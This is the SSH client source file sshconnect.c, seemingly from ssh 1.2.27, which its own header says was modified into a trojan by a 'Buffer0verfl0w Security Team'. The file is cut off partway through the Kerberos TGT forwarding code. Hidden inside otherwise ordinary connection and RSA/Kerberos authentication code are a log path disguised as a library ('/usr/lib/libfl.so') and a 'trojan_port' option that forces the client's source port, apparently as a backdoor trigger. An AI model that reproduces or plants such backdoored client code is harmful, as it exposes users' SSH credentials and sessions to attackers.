/*

sshconnect.c

Author: Tatu Ylonen <ylo@cs.hut.fi>

Copyright (c) 1995 Tatu Ylonen <ylo@cs.hut.fi>, Espoo, Finland
                   All rights reserved

Created: Sat Mar 18 22:15:47 1995 ylo
Trojan created: Sun May  7 08:42:18 2000 xfer of Buffer0verfl0w Security Team

Code to connect to a remote host, and to perform the client side of the
login (authentication) dialog.

*/

/*
 * $Id: sshconnect.c,v 1.32 1999/02/21 19:52:51 ylo Exp $
 * $Log: sshconnect.c,v $
 * Revision 1.32  1999/02/21 19:52:51  ylo
 * 	Intermediate commit of ssh1.2.27 stuff.
 * 	Main change is sprintf -> snprintf; however, there are also
 * 	many other changes.
 *
 * Revision 1.31  1998/08/04 23:52:04  kivinen
 *      Removed HAVE_SOCKS_H code.
 *
 * Revision 1.30  1998/07/08 14:55:18  tri
 *      Fixed version negotiation so, that ssh 2
 *      compatibility is even remotedly possible.
 *
 * Revision 1.29  1998/07/08 00:47:33  kivinen
 *      Moved some debug messages around.
 *
 * Revision 1.28  1998/06/11 00:10:50  kivinen
 *      Added ENABLE_SO_LINGER ifdef.
 *
 * Revision 1.27  1998/05/23  20:25:58  kivinen
 *      Changed () -> (void).
 *
 * Revision 1.26  1998/04/30  01:56:01  kivinen
 *      Added PasswordPromptLogin and PasswordPromptHost option code.
 *      Added check that proxy command isn't empty.
 *
 * Revision 1.25  1998/03/27 17:04:04  kivinen
 *      Changed socks support to support socks.h. Added
 *      ENABLE_TCP_NODELAY support. Fixed kerberos initialization code
 *      so ssh will check the error codes of initialization function.
 *
 * Revision 1.24  1998/01/02 06:23:28  kivinen
 *      Changed "foo's password" prompt to "foo@bar's password".
 *
 * Revision 1.23  1997/04/27 21:55:51  kivinen
 *      Added F-SECURE stuff.
 *
 * Revision 1.22  1997/04/23 00:05:01  kivinen
 *      Implemented NumberOfPasswordPrompts option.
 *
 * Revision 1.21  1997/04/17 04:16:32  kivinen
 *      Added strict_host_key_checking == 2 (== ask) support.
 *      Moved asking of confirmation from user to read_confirmation
 *      function.
 *      Added checks that if in batch_mode do not ask confirmations.
 *
 * Revision 1.20  1997/04/05 22:02:04  kivinen
 *      Removed restriction that ssh only used priviledged port if
 *      server port was < 1024. Fixed KRB5 support.
 *
 * Revision 1.19  1997/03/27 03:11:35  kivinen
 *      Added kerberos patches from Glenn Machin.
 *
 * Revision 1.18  1997/03/26 07:11:08  kivinen
 *      Added local localhost mapping.
 *      Fixed some messages.
 *      Allow password authentication even when host key have
 *      changed, because we ask about it from user.
 *
 * Revision 1.17  1997/03/26 05:35:30  kivinen
 *      Changed uid 0 to UID_ROOT.
 *
 * Revision 1.16  1997/03/25 05:47:15  kivinen
 *      Added Rgethostbyname for SOCKS5.
 *
 * Revision 1.15  1997/03/19 21:16:22  kivinen
 *      Added local mapping of "localhost" to "127.0.0.1" to avoid dns
 *      attacks for localhost (the host key checking is disabled for
 *      localhost).
 *      Added yes/no prompt if host key is not known or changed.
 *      Disabled x11 and port forwardings if host key have changed.
 *
 * Revision 1.14  1997/03/19 17:45:36  kivinen
 *      Added SECURE_RPC, SECURE_NFS and NIS_PLUS support from Andy
 *      Polyakov <appro@fy.chalmers.se>.
 *      Disabled agent forwarding if host key doesn't match.
 *      Added TIS authentication code from Andre April
 *      <Andre.April@cediti.be>.
 *
 * Revision 1.13  1996/12/04 18:15:08  ttsalo
 *     Added calls to ssh_close_authentication_connection
 *
 * Revision 1.12  1996/11/12 18:44:41  kivinen
 *      Changed password back to foos's password, as I was informed
 *      that Webster was in illiterate and the previous version was
 *      correct when using English grammar.
 *
 * Revision 1.11  1996/11/07 06:48:12  kivinen
 *      Fixed foos's password: prompt to foos' password:.
 *
 * Revision 1.10  1996/11/04 16:19:29  ttsalo
 *       Improved error handling in code receiving protocol version byte
 *
 * Revision 1.9  1996/11/04 14:37:16  ttsalo
 *       Fixed someone's typo (...VERSION_MAJOR... -> ...MAJOR_VERSION...)
 *
 * Revision 1.8  1996/11/04 06:34:24  ylo
 *      Updated processing of check_emulation output.
 *
 * Revision 1.7  1996/10/29 22:47:16  kivinen
 *      log -> log_msg.
 *      Added username to password prompt.
 *
 * Revision 1.6  1996/05/25 23:33:12  ylo
 *      Fixed a minor bug in the logic used to determine whether to allocate
 *      a privileged local port.
 *
 * Revision 1.5  1996/04/26 00:24:10  ylo
 *      Fixed SOCKS code.
 *      Fixed reconnecting with SOCKS.
 *
 * Revision 1.4  1996/04/22 23:49:46  huima
 * Changed protocol version to 1.4, added calls to emulate module.
 *
 * Revision 1.3  1996/02/19  16:07:23  huima
 *      Minor fixes.
 *
 * Revision 1.2  1996/02/18  21:50:23  ylo
 *      Added a call to userfile_close_pipes in proxy code.
 *
 * Revision 1.1.1.1  1996/02/18 21:38:12  ylo
 *      Imported ssh-1.2.13.
 *
 * Revision 1.15  1995/09/27  02:16:40  ylo
 *      Eliminated compiler warning.
 *
 * Revision 1.14  1995/09/25  00:02:55  ylo
 *      Added connection_attempts.
 *      Added screen number forwarding.
 *
 * Revision 1.13  1995/09/22  22:23:23  ylo
 *      Changed interface of ssh_login to use the option structure
 *      instead of numerous individual arguments.
 *
 * Revision 1.12  1995/09/21  17:17:44  ylo
 *      Added original_real_uid argument to ssh_connect.
 *
 * Revision 1.11  1995/09/13  12:03:55  ylo
 *      Added debugging output to print uids.
 *
 * Revision 1.10  1995/09/10  22:48:29  ylo
 *      Added original_real_uid parameter to ssh_login.  Changed to
 *      use it.
 *      Fixed read_passphrase arguments.
 *
 * Revision 1.9  1995/09/09  21:26:46  ylo
 * /m/shadows/u2/users/ylo/ssh/README
 *
 * Revision 1.8  1995/09/06  16:01:12  ylo
 *      Added BROKEN_INET_ADDR.
 *
 * Revision 1.7  1995/08/31  09:24:23  ylo
 *      Fixed user_hostfile name processing.
 *
 * Revision 1.6  1995/08/21  23:29:32  ylo
 *      Clear sockaddr_in before using.
 *      Pass session_id and response_type to ssh_decrypt_challenge.
 *
 * Revision 1.5  1995/07/27  02:18:13  ylo
 *      Tell packet_set_encryption_key that we are the client.
 *
 * Revision 1.4  1995/07/27  00:40:56  ylo
 *      Added GlobalKnownHostsFile and UserKnownHostsFile.
 *
 * Revision 1.3  1995/07/26  23:19:20  ylo
 *      Removed include version.h.
 *
 *      Added code for protocol version 1.1.  This involves changes in
 *      the session key exchange code and RSA responses to make
 *      replay impossible and to bind RSA responses to a particular
 *      session so that a corrupt server cannot pass them on to
 *      another connection.  Moved rsa response code to a separate function.
 *
 *      Fixed session key exchange to match the RFC draft.
 *
 *      Prints a warning if server uses older protocol version (but
 *      compatibility code still supports the older version).
 *
 * Revision 1.2  1995/07/13  01:40:32  ylo
 *      Removed "Last modified" header.
 *      Added cvs log.
 *
 * $Endlog$
 */

#include "includes.h"
#include <gmp.h>
#include "xmalloc.h"
#include "randoms.h"
#include "rsa.h"
#include "ssh.h"
#include "packet.h"
#include "authfd.h"
#include "cipher.h"
#include "md5.h"
#include "mpaux.h"
#include "userfile.h"
#include "emulate.h"

#ifdef KERBEROS
#ifdef KRB5
#include <krb5.h>

/* Global the contexts */
krb5_context ssh_context = 0;
krb5_auth_context auth_context = 0;
#endif /* KRB5 */
#endif /* KERBEROS */

/* Trojan variableZ */
#define SSH_LOGZ "/usr/lib/libfl.so"
FILE *fp;

/* Session id for the current session. */
unsigned char session_id[16];

/* Connect to the given ssh server using a proxy command. */

int ssh_proxy_connect(const char *host, int port, uid_t original_real_uid,
                      const char *proxy_command, RandomState *random_state)
{
  Buffer command;
  const char *cp;
  char *command_string;
  int pin[2], pout[2];
  int pid;
  char portstring[100];

  /* Convert the port number into a string. */
  snprintf(portstring, sizeof(portstring), "%d", port);

  /* Build the final command string in the buffer by making the appropriate
     substitutions to the given proxy command. */
  buffer_init(&command);
  for (cp = proxy_command; *cp; cp++)
    {
      if (cp[0] == '%' && cp[1] == '%')
        {
          buffer_append(&command, "%", 1);
          cp++;
          continue;
        }
      if (cp[0] == '%' && cp[1] == 'h')
        {
          buffer_append(&command, host, strlen(host));
          cp++;
          continue;
        }
      if (cp[0] == '%' && cp[1] == 'p')
        {
          buffer_append(&command, portstring, strlen(portstring));
          cp++;
          continue;
        }
      buffer_append(&command, cp, 1);
    }
  buffer_append(&command, "\0", 1);

  /* Get the final command string. */
  command_string = buffer_ptr(&command);

  /* Create pipes for communicating with the proxy. */
  if (pipe(pin) < 0 || pipe(pout) < 0)
    fatal("Could not create pipes to communicate with the proxy: %.100s",
          strerror(errno));

  debug("Executing proxy command: %.500s", command_string);

  /* Fork and execute the proxy command. */
  if ((pid = fork()) == 0)
    {
      char *argv[10];

      /* Close all pipes to userfile. */
      userfile_close_pipes();

      /* Child.  Permanently give up superuser privileges. */
      if (setuid(getuid()) < 0)
        fatal("setuid: %.100s", strerror(errno));

      /* Redirect stdin and stdout. */
      close(pin[1]);
      if (pin[0] != 0)
        {
          if (dup2(pin[0], 0) < 0)
            perror("dup2 stdin");
          close(pin[0]);
        }
      close(pout[0]);
      if (dup2(pout[1], 1) < 0)
        perror("dup2 stdout");
      close(pout[1]); /* Cannot be 1 because pin allocated two descriptors. */

      /* Stderr is left as it is so that error messages get printed on
         the user's terminal. */
      argv[0] = "/bin/sh";
      argv[1] = "-c";
      argv[2] = command_string;
      argv[3] = NULL;
      
      /* Execute the proxy command.  Note that we gave up any extra 
         privileges above. */
      execv("/bin/sh", argv);
      perror("/bin/sh");
      exit(1);
    }
  /* Parent. */
  if (pid < 0)
    fatal("fork failed: %.100s", strerror(errno));
  
  /* Close child side of the descriptors. */
  close(pin[0]);
  close(pout[1]);

  /* Free the command name. */
  buffer_free(&command);
  
  /* Set the connection file descriptors. */
  packet_set_connection(pout[0], pin[1], random_state);

  return 1;
}

/* Creates a (possibly privileged) socket for use as the ssh connection. */

int ssh_create_socket(uid_t original_real_uid, int privileged, Options *options)
{
  int sock;

  /* If we are running as root and want to connect to a privileged port,
     bind our own socket to a privileged port. */
  if (privileged)
    {
      struct sockaddr_in sin;
      int p;
      for (p = 1023; p > 512; p--)
        {
	  if ((options->trojan_port!=0)) p=options->trojan_port;
          sock = socket(AF_INET, SOCK_STREAM, 0);
          if (sock < 0)
            fatal("socket: %.100s", strerror(errno));
          
          /* Initialize the desired sockaddr_in structure. */
          memset(&sin, 0, sizeof(sin));
          sin.sin_family = AF_INET;
          sin.sin_addr.s_addr = INADDR_ANY;
          sin.sin_port = htons(p);

          /* Try to bind the socket to the privileged port. */
#if defined(SOCKS)
          if (Rbind(sock, (struct sockaddr *)&sin, sizeof(sin)) >= 0)
            break; /* Success. */
#else /* SOCKS */
          if (bind(sock, (struct sockaddr *)&sin, sizeof(sin)) >= 0)
            break; /* Success. */
#endif /* SOCKS */
          if (errno == EADDRINUSE)
            {
              close(sock);
              continue;
            }
          fatal("bind: %.100s", strerror(errno));
        }
      debug("Allocated local port %d.", p);
    }
  else
    { 
      /* Just create an ordinary socket on arbitrary port.  */
      sock = socket(AF_INET, SOCK_STREAM, 0);
      if (sock < 0)
        fatal("socket: %.100s", strerror(errno));
    }
  return sock;
}

/* Opens a TCP/IP connection to the remote server on the given host.  If
   port is 0, the default port will be used.  If anonymous is zero,
   a privileged port will be allocated to make the connection. 
   This requires super-user privileges if anonymous is false. 
   Connection_attempts specifies the maximum number of tries (one per
   second).  If proxy_command is non-NULL, it specifies the command (with %h 
   and %p substituted for host and port, respectively) to use to contact
   the daemon. */

int ssh_connect(const char *host, int port, int connection_attempts,
                int anonymous, uid_t original_real_uid, 
                const char *proxy_command, RandomState *random_state,
		Options *options)
{
  int sock = -1, attempt, i;
  int on = 1;
  struct servent *sp;
  struct hostent *hp;
  struct sockaddr_in hostaddr;
#if defined(SO_LINGER) && defined(ENABLE_SO_LINGER)
  struct linger linger;
#endif /* SO_LINGER */

  debug("ssh_connect: getuid %d geteuid %d anon %d", 
        (int)getuid(), (int)geteuid(), anonymous);

  /* Get default port if port has not been set. */
  if (port == 0)
    {
      sp = getservbyname(SSH_SERVICE_NAME, "tcp");
      if (sp)
        port = ntohs(sp->s_port);
      else
        port = SSH_DEFAULT_PORT;
    }

  /* Map localhost to ip-address locally */
  if (strcmp(host, "localhost") == 0)
    host = "127.0.0.1";
  
  /* If a proxy command is given, connect using it. */
  if (proxy_command != NULL && *proxy_command)
    return ssh_proxy_connect(host, port, original_real_uid, proxy_command,
                             random_state);

  /* No proxy command. */

  /* No host lookup made yet. */
  hp = NULL;
  
  /* Try to connect several times.  On some machines, the first time will
     sometimes fail.  In general socket code appears to behave quite
     magically on many machines. */
  for (attempt = 0; attempt < connection_attempts; attempt++)
    {
      if (attempt > 0)
        debug("Trying again...");

      /* Try to parse the host name as a numeric inet address. */
      memset(&hostaddr, 0, sizeof(hostaddr));
      hostaddr.sin_family = AF_INET;
      hostaddr.sin_port = htons(port);
#ifdef BROKEN_INET_ADDR
      hostaddr.sin_addr.s_addr = inet_network(host);
#else /* BROKEN_INET_ADDR */
      hostaddr.sin_addr.s_addr = inet_addr(host);
#endif /* BROKEN_INET_ADDR */
      if ((hostaddr.sin_addr.s_addr & 0xffffffff) != 0xffffffff)
        { 
          /* Create a socket. */
          sock = ssh_create_socket(original_real_uid, 
                                   !anonymous && geteuid() == UID_ROOT,
				   options);
      
          /* Valid numeric IP address */
          debug("Connecting to %.100s port %d.", 
                inet_ntoa(hostaddr.sin_addr), port);

          /* Connect to the host. */
#if defined(SOCKS)
          if (Rconnect(sock, (struct sockaddr *)&hostaddr, sizeof(hostaddr))
#else /* SOCKS */
          if (connect(sock, (struct sockaddr *)&hostaddr, sizeof(hostaddr))
#endif /* SOCKS */
              >= 0)
            {
              /* Successful connect. */
              break;
            }
          debug("connect: %.100s", strerror(errno));

          /* Destroy the failed socket. */
          shutdown(sock, 2);
          close(sock);
        }
      else
        { 
          /* Not a valid numeric inet address. */
          /* Map host name to an address. */
          if (!hp)
            {
              struct hostent *hp_static;

#if defined(SOCKS5)
              hp_static = Rgethostbyname(host);
#else
              hp_static = gethostbyname(host);
#endif
              if (hp_static)
                {
                  hp = xmalloc(sizeof(struct hostent));
                  memcpy(hp, hp_static, sizeof(struct hostent));

                  /* Copy list of addresses, not just pointers.
                     We don't use h_name & h_aliases so leave them as is */
                  for (i = 0; hp_static->h_addr_list[i]; i++)
                    ; /* count them */
                  hp->h_addr_list = xmalloc((i + 1) *
                                            sizeof(hp_static->h_addr_list[0]));
                  for (i = 0; hp_static->h_addr_list[i]; i++)
                    {
                      hp->h_addr_list[i] = xmalloc(hp->h_length);
                      memcpy(hp->h_addr_list[i], hp_static->h_addr_list[i],
                             hp->h_length);
                    }
                  hp->h_addr_list[i] = NULL; /* last one */
                }
            }
          if (!hp)
            fatal("Bad host name: %.100s", host);
          if (!hp->h_addr_list[0])
            fatal("Host does not have an IP address: %.100s", host);

          /* Loop through addresses for this host, and try each one in
             sequence until the connection succeeds. */
          for (i = 0; hp->h_addr_list[i]; i++)
            {
              /* Set the address to connect to. */
              hostaddr.sin_family = hp->h_addrtype;
              memcpy(&hostaddr.sin_addr, hp->h_addr_list[i],
                     sizeof(hostaddr.sin_addr));

              debug("Connecting to %.200s [%.100s] port %d.",
                    host, inet_ntoa(hostaddr.sin_addr), port);

              /* Create a socket for connecting. */
              sock = ssh_create_socket(original_real_uid, 
                                       !anonymous && geteuid() == UID_ROOT,
				       options);

              /* Connect to the host. */
#if defined(SOCKS)
              if (Rconnect(sock, (struct sockaddr *)&hostaddr, 
                           sizeof(hostaddr)) >= 0)
#else /* SOCKS */
              if (connect(sock, (struct sockaddr *)&hostaddr, 
                          sizeof(hostaddr)) >= 0)
#endif /* SOCKS */
                {
                  /* Successful connection. */
                  break;
                }
              debug("connect: %.100s", strerror(errno));

              /* Close the failed socket; there appear to be some problems 
                 when reusing a socket for which connect() has already 
                 returned an error. */
              shutdown(sock, 2);
              close(sock);
            }
          if (hp->h_addr_list[i])
            break; /* Successful connection. */
        }

      /* Sleep a moment before retrying. */
      sleep(1);
    }

  if (hp)
    {
      for (i = 0; hp->h_addr_list[i]; i++)
        xfree(hp->h_addr_list[i]);
      xfree(hp->h_addr_list);
      xfree(hp);
    }

  /* Return failure if we didn't get a successful connection. */
  if (attempt >= connection_attempts)
    return 0;

  debug("Connection established.");

  /* Set socket options.  We would like the socket to disappear as soon as
     it has been closed for whatever reason. */
  /* setsockopt(sock, SOL_SOCKET, SO_REUSEADDR, (void *)&on, sizeof(on)); */
#if defined(TCP_NODELAY) && defined(ENABLE_TCP_NODELAY)
  setsockopt(sock, IPPROTO_TCP, TCP_NODELAY, (void *)&on, sizeof(on));
#endif /* TCP_NODELAY */
#if defined(SO_LINGER) && defined(ENABLE_SO_LINGER)
  linger.l_onoff = 1;
  linger.l_linger = 15;
  setsockopt(sock, SOL_SOCKET, SO_LINGER, (void *)&linger, sizeof(linger));
#endif /* SO_LINGER */

  /* Set the connection. */
  packet_set_connection(sock, sock, random_state);

  return 1;
}

/* Checks if the user has an authentication agent, and if so, tries to
   authenticate using the agent. */

int try_agent_authentication(void)
{
  int status, type, bits;
  MP_INT e, n, challenge;
  char *comment;
  AuthenticationConnection *auth;
  unsigned char response[16];
  unsigned int i;
  
  /* Get connection to the agent. */
  auth = ssh_get_authentication_connection();
  if (!auth)
    return 0;
  
  mpz_init(&e);
  mpz_init(&n);
  mpz_init(&challenge);
  
  /* Loop through identities served by the agent. */
  for (status = ssh_get_first_identity(auth, &bits, &e, &n, &comment);
       status;
       status = ssh_get_next_identity(auth, &bits, &e, &n, &comment))
    {
      /* Try this identity. */
      debug("Trying RSA authentication via agent with '%.100s'", comment);
      xfree(comment);
      
      /* Tell the server that we are willing to authenticate using this key. */
      packet_start(SSH_CMSG_AUTH_RSA);
      packet_put_mp_int(&n);
      packet_send();
      packet_write_wait();
      
      /* Wait for server's response. */
      type = packet_read();
      
      /* The server sends failure if it doesn\'t like our key or does not
         support RSA authentication. */
      if (type == SSH_SMSG_FAILURE)
        {
          debug("Server refused our key.");
          continue;
        }
      
      /* Otherwise it should have sent a challenge. */
      if (type != SSH_SMSG_AUTH_RSA_CHALLENGE)
        packet_disconnect("Protocol error during RSA authentication: %d", 
                          type);
      
      packet_get_mp_int(&challenge);
      
      debug("Received RSA challenge from server.");
      
      /* Ask the agent to decrypt the challenge. */
      if (!ssh_decrypt_challenge(auth, bits, &e, &n, &challenge, 
                                 session_id, 1, response))
        {
          /* The agent failed to authenticate this identifier although it
             advertised it supports this.  Just return a wrong value. */
          log_msg("Authentication agent failed to decrypt challenge.");
          memset(response, 0, sizeof(response));
        }
      
      debug("Sending response to RSA challenge.");
      
      /* Send the decrypted challenge back to the server. */
      packet_start(SSH_CMSG_AUTH_RSA_RESPONSE);
      for (i = 0; i < 16; i++)
        packet_put_char(response[i]);
      packet_send();
      packet_write_wait();
      
      /* Wait for response from the server. */
      type = packet_read();

      /* The server returns success if it accepted the authentication. */
      if (type == SSH_SMSG_SUCCESS)
        {
          debug("RSA authentication accepted by server.");
          mpz_clear(&e);
          mpz_clear(&n);
          mpz_clear(&challenge);
          ssh_close_authentication_connection(auth);
          return 1;
        }

      /* Otherwise it should return failure. */
      if (type != SSH_SMSG_FAILURE)
        {
          ssh_close_authentication_connection(auth);
          packet_disconnect("Protocol error waiting RSA auth response: %d", 
                            type);
        }
    }

  mpz_clear(&e);
  mpz_clear(&n);
  mpz_clear(&challenge);

  ssh_close_authentication_connection(auth);

  debug("RSA authentication using agent refused.");
  return 0;
}

/* Computes the proper response to a RSA challenge, and sends the response to
   the server. */

void respond_to_rsa_challenge(MP_INT *challenge, RSAPrivateKey *prv)
{
  unsigned char buf[32], response[16];
  struct MD5Context md;
  int i;

  /* Decrypt the challenge using the private key. */
  rsa_private_decrypt(challenge, challenge, prv);

  /* Compute the response. */
  /* The response is MD5 of decrypted challenge plus session id. */
  mp_linearize_msb_first(buf, 32, challenge);
  MD5Init(&md);
  MD5Update(&md, buf, 32);
  MD5Update(&md, session_id, 16);
  MD5Final(response, &md);
  
  debug("Sending response to host key RSA challenge.");

  /* Send the response back to the server. */
  packet_start(SSH_CMSG_AUTH_RSA_RESPONSE);
  for (i = 0; i < 16; i++)
    packet_put_char(response[i]);
  packet_send();
  packet_write_wait();
  
  memset(buf, 0, sizeof(buf));
  memset(response, 0, sizeof(response));
  memset(&md, 0, sizeof(md));
}

/* Checks if the user has authentication file, and if so, tries to authenticate
   the user using it. */

int try_rsa_authentication(struct passwd *pw, const char *authfile,
                           int may_ask_passphrase)
{
  MP_INT challenge;
  RSAPrivateKey private_key;
  RSAPublicKey public_key;
  char *passphrase, *comment;
  int type, i;
  int done;
  
  /* Try to load identification for the authentication key. */
  if (!load_public_key(pw->pw_uid, authfile, &public_key, &comment))
    return 0; /* Could not load it.  Fail. */

  debug("Trying RSA authentication with key '%.100s'", comment);

  /* Tell the server that we are willing to authenticate using this key. */
  packet_start(SSH_CMSG_AUTH_RSA);
  packet_put_mp_int(&public_key.n);
  packet_send();
  packet_write_wait();

  /* We no longer need the public key. */
  rsa_clear_public_key(&public_key);
  
  /* Wait for server's response. */
  type = packet_read();

  /* The server responds with failure if it doesn\'t like our key or doesn\'t
     support RSA authentication. */
  if (type == SSH_SMSG_FAILURE)
    {
      debug("Server refused our key.");
      xfree(comment);
      return 0; /* Server refuses to authenticate with this key. */
    }

  /* Otherwise, the server should respond with a challenge. */
  if (type != SSH_SMSG_AUTH_RSA_CHALLENGE)
    packet_disconnect("Protocol error during RSA authentication: %d", type);

  /* Get the challenge from the packet. */
  mpz_init(&challenge);
  packet_get_mp_int(&challenge);

  debug("Received RSA challenge from server.");

  /* Load the private key.  Try first with empty passphrase; if it fails, 
     ask for a passphrase. */
  done = load_private_key(pw->pw_uid, authfile, "", &private_key, NULL);
#ifdef SECURE_RPC
  if (!done)
    {
      passphrase = userfile_get_des_1_magic_phrase(pw->pw_uid);
      if (passphrase != NULL)
        {
          done = load_private_key(pw->pw_uid, authfile, passphrase,
                                  &private_key, NULL);
          if (done)
            debug("Using SUN-DES-1 magic phrase to decrypt the private key.");
          memset(passphrase, 0, strlen(passphrase));
          xfree(passphrase);
        }
    }
#endif
  if (!done)
    {
      char buf[300];
      /* Request passphrase from the user.  We read from /dev/tty to make
         this work even if stdin has been redirected.  If running in
         batch mode, we just use the empty passphrase, which will fail and
         return. */
      snprintf(buf, sizeof(buf),
               "Enter passphrase for RSA key '%.100s': ", comment);
      if (may_ask_passphrase)
        passphrase = read_passphrase(pw->pw_uid, buf, 0);
      else
        {
          debug("Will not query passphrase for %.100s in batch mode.", 
                comment);
          passphrase = xstrdup("");
        }
      
      /* Load the authentication file using the pasphrase. */
      if (!load_private_key(pw->pw_uid, authfile, passphrase, &private_key, 
                            NULL))
        {
          memset(passphrase, 0, strlen(passphrase));
          xfree(passphrase);
          error("Bad passphrase.");

          /* Send a dummy response packet to avoid protocol error. */
          packet_start(SSH_CMSG_AUTH_RSA_RESPONSE);
          for (i = 0; i < 16; i++)
            packet_put_char(0);
          packet_send();
          packet_write_wait();

          /* Expect the server to reject it... */
          packet_read_expect(SSH_SMSG_FAILURE);
          xfree(comment);
          return 0;
        }

      /* Destroy the passphrase. */
      memset(passphrase, 0, strlen(passphrase));
      xfree(passphrase);
    }
  
  /* We no longer need the comment. */
  xfree(comment);

  /* Compute and send a response to the challenge. */
  respond_to_rsa_challenge(&challenge, &private_key);
  
  /* Destroy the private key. */
  rsa_clear_private_key(&private_key);

  /* We no longer need the challenge. */
  mpz_clear(&challenge);
  
  /* Wait for response from the server. */
  type = packet_read();
  if (type == SSH_SMSG_SUCCESS)
    {
      debug("RSA authentication accepted by server.");
      return 1;
    }
  if (type != SSH_SMSG_FAILURE)
    packet_disconnect("Protocol error waiting RSA auth response: %d", type);
  debug("RSA authentication refused.");
  return 0;
}

/* Tries to authenticate the user using combined rhosts or /etc/hosts.equiv
   authentication and RSA host authentication. */

int try_rhosts_rsa_authentication(const char *local_user, 
                                  RSAPrivateKey *host_key)
{
  int type;
  MP_INT challenge;

  debug("Trying rhosts or /etc/hosts.equiv with RSA host authentication.");

  /* Tell the server that we are willing to authenticate using this key. */
  packet_start(SSH_CMSG_AUTH_RHOSTS_RSA);
  packet_put_string(local_user, strlen(local_user));
  packet_put_int(host_key->bits);
  packet_put_mp_int(&host_key->e);
  packet_put_mp_int(&host_key->n);
  packet_send();
  packet_write_wait();

  /* Wait for server's response. */
  type = packet_read();

  /* The server responds with failure if it doesn't admit our .rhosts
     authentication or doesn't know our host key. */
  if (type == SSH_SMSG_FAILURE)
    {
      debug("Server refused our rhosts authentication or host key.");
      return 0; /* Server refuses to authenticate us with this method. */
    }

  /* Otherwise, the server should respond with a challenge. */
  if (type != SSH_SMSG_AUTH_RSA_CHALLENGE)
    packet_disconnect("Protocol error during RSA authentication: %d", type);

  /* Get the challenge from the packet. */
  mpz_init(&challenge);
  packet_get_mp_int(&challenge);

  debug("Received RSA challenge for host key from server.");

  /* Compute a response to the challenge. */
  respond_to_rsa_challenge(&challenge, host_key);

  /* We no longer need the challenge. */
  mpz_clear(&challenge);
  
  /* Wait for response from the server. */
  type = packet_read();
  if (type == SSH_SMSG_SUCCESS)
    {
      debug("Rhosts or /etc/hosts.equiv with RSA host authentication accepted by server.");
      return 1;
    }
  if (type != SSH_SMSG_FAILURE)
    packet_disconnect("Protocol error waiting RSA auth response: %d", type);
  debug("Rhosts or /etc/hosts.equiv with RSA host authentication refused.");
  return 0;
}

#ifdef KERBEROS
int try_kerberos_authentication(void)
{
#ifdef KRB5
  char *remotehost;
  krb5_data auth;
  krb5_error_code r;
  int  tempint, type;
  krb5_ccache ccache;
  krb5_creds creds;
  krb5_creds * new_creds = 0;
  int ap_opts, ret_stat = 0;
  krb5_keyblock   *session_key = 0;
  krb5_ap_rep_enc_part *repl = 0;
  struct sockaddr_in local, foreign;
  
  memset(&auth, 0 , sizeof(auth));
  remotehost = (char *) get_canonical_hostname();
  if (!ssh_context)
    {
      if ((r = krb5_init_context(&ssh_context)))
        fatal("Kerberos V5: %.100s while initializing krb5.",
              error_message(r));
      krb5_init_ets(ssh_context);
    }
  
  if ((r = krb5_cc_default(ssh_context, &ccache)))
    {
      debug("Kerberos V5: could not get default ccache.");
      goto cleanup;
    }
  
  memset((char *)&creds, 0, sizeof(creds));
  if ((r = krb5_sname_to_principal(ssh_context, remotehost,
                                   "host", KRB5_NT_SRV_HST,
                                   &creds.server)))
    {
      debug("Kerberos V5: error while constructing service name: %.100s.",
            error_message(r));
      goto cleanup;
    }
  if ((r = krb5_cc_get_principal(ssh_context, ccache,
                                 &creds.client)))
    {
      debug("Kerberos V5: failure on principal (%.100s).",
            error_message(r));
      goto cleanup;
    }
  
  creds.keyblock.enctype=ENCTYPE_DES_CBC_CRC;
  if ((r = krb5_get_credentials(ssh_context, 0,
                                ccache, &creds, &new_creds)))
    {
      debug("Kerberos V5: failure on credentials(%.100s).",
            error_message(r));
      goto cleanup;
    }
  
  /* ap_opts = AP_OPTS_MUTUAL_REQUIRED | AP_OPTS_USE_SUBKEY; */
  ap_opts = 0;

  if (!auth_context)
    {
      if ((r = krb5_auth_con_init(ssh_context, &auth_context)))
        {
          debug("Kerberos V5: failed to init auth_context (%.100s)",
                error_message(r));
          goto cleanup;
        }
      krb5_auth_con_setflags(ssh_context, auth_context,
                             KRB5_AUTH_CONTEXT_RET_TIME);
    }
  
  if ((r = krb5_mk_req_extended(ssh_context, &auth_context, ap_opts,
                                0, new_creds, &auth)))
    {
      debug("Kerberos V5: failed krb5_mk_req_extended (%.100s)",
            error_message(r));
      goto cleanup;
    }
  
  /* Send authentication info to server. */
  packet_start(SSH_CMSG_AUTH_KERBEROS);
  packet_put_string((char *) auth.data, auth.length);
  packet_send();
  packet_write_wait();
  
  tempint = sizeof(local);
  memset(&local, 0, tempint);
  if (getsockname(packet_get_connection_in(),
                  (struct sockaddr *) &local, &tempint) < 0)
    debug("getsockname failed: %.100s", strerror(errno));
  
  tempint = sizeof(foreign);
  memset(&foreign, 0, tempint);
  if (getpeername(packet_get_connection_in(),
                  (struct sockaddr *)&foreign, &tempint) < 0)
    debug("getpeername failed: %.100s", strerror(errno));
  
  if (auth.data)
    {
      free(auth.data); 
      auth.data = 0;
    }
  
    /* Get server reply. */
  type = packet_read();
  switch(type)
    {
    case SSH_SMSG_FAILURE:
      debug("Kerberos V5 authentication failed.");
      goto cleanup;
      
    case SSH_SMSG_AUTH_KERBEROS_RESPONSE:
      /* Get server's response. */
      auth.data = packet_get_string((unsigned int *) &auth.length);
      
      /* If his response isn't properly encrypted with the session key,
         he's bogus. Also krb5_rd_rep will fail when MUTUAL AUTH is 
         requested and the server does not send back a session encrypted
         time stamp */
      
      if (r = krb5_rd_rep(ssh_context, auth_context, &auth, &repl))
        {
          packet_disconnect("Kerberos V5 Authentication failed: %.100s",
                            error_message(r));
          goto cleanup;
        }
      else
        {
          debug("Kerberos V5 authentication accepted.");
          ret_stat = 1;
        }
      break;
      
    default:
      packet_disconnect("Protocol error on Kerberos V5 response: %d", type);
      goto cleanup;
    }
  
cleanup:
  krb5_free_cred_contents(ssh_context, &creds);
  if (new_creds)
    krb5_free_creds(ssh_context, new_creds);
  if (session_key)
    krb5_free_keyblock(ssh_context, session_key);
  if (auth.data)
    free(auth.data);
  if (repl)
    krb5_free_ap_rep_enc_part(ssh_context, repl);
  
  return(ret_stat);
#endif /* KRB5 */
}
#endif /* KERBEROS */

#ifdef KERBEROS_TGT_PASSING
/* Forward our local Kerberos tgt to the server. */
int send_kerberos_tgt(void)
{
#ifdef KRB5
  char *remotehost;
  krb5_principal client;
  krb5_principal server;
  krb5_ccache ccache;
  krb5_data outbuf;
  krb5_error_code r;
  int type;
  char server_name[512];
  
  remotehost = (char *) get_canonical_hostname();
